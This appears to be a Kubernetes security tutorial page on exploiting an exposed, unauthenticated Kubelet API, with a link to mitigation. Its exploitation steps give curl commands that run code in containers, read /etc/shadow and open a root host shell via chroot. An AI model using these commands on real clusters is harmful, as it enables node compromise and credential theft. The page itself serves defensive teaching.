---
sidebar_position: 5
title: "Exposed Kubelet API"
description: "How an exposed Kubelet API can be exploited to execute commands on nodes and compromise Kubernetes clusters."
keywords: [kubernetes security, kubelet API, kubelet security, node security, kubelet exploit, port 10250, anonymous access, node compromise, container runtime, kubernetes nodes]
tags: [attack-vector, kubelet, node-security, CKS]
related:
  - /kubernetes-security/best-practices/cluster-setup-and-hardening/node-security/kubelet-security/
  - /kubernetes-security/fundamentals/authentication/authentication-methods/
  - /kubernetes-security/attack-vectors/privileged-container-escape/
  - /kubernetes-security/best-practices/cluster-setup-and-hardening/cis/cis-benchmark-for-k8s/
---

# Exposed Kubelet API

The **Kubelet API** manages pods on individual nodes in a Kubernetes cluster. When left exposed and unauthenticated, it allows attackers to execute commands on containers or even the underlying host, putting the entire cluster at risk.

This article demonstrates how attackers discover and exploit insecure Kubelet APIs to gain remote control over nodes and escalate privileges.

---

## Exploitation Steps: Gaining Access to the Kubelet API

### 1. Scan for Exposed Kubelet Ports

Attackers scan the cluster’s IP range for open Kubelet ports (default: 10250):

```bash
nmap -p 10250 --open <cluster-ip-range>
```

### 2. Query the Kubelet API

If authentication is not required, the attacker lists all pods on the node:

```bash
curl -k https://<kubelet-ip>:10250/pods
```

This reveals metadata and container names that can be used for further exploitation.

### 3. Execute Commands in a Container

If unauthenticated access is allowed, the attacker can run arbitrary commands inside containers:

```bash
curl -k -X POST "https://<kubelet-ip>:10250/run/<namespace>/<pod-name>/<container-name>" -d 'cmd=cat /etc/shadow'
```

### 4. Escalate to the Host

If the container has access to the host filesystem, the attacker can escape the container and access the host:

```bash
curl -k -X POST "https://<kubelet-ip>:10250/run/default/root-container" -d 'cmd=chroot /host bash'
```

This effectively grants remote root shell access to the worker node.

---

### Result

Exposing the Kubelet API without authentication or access controls can lead to:

- Remote command execution inside pods
- Exposure of sensitive files and environment data
- Host-level access via container escape
- Full cluster compromise

---

## Mitigation

➡ [Kubelet Security](/kubernetes-security/best-practices/cluster-setup-and-hardening/node-security/kubelet-security)

---

## References

This article is based on information from the following official sources:

1. [Kubelet](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/) - Kubernetes Documentation
2. [Kubelet authentication/authorization](https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/) - Kubernetes Documentation
3. [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes) - Center for Internet Security
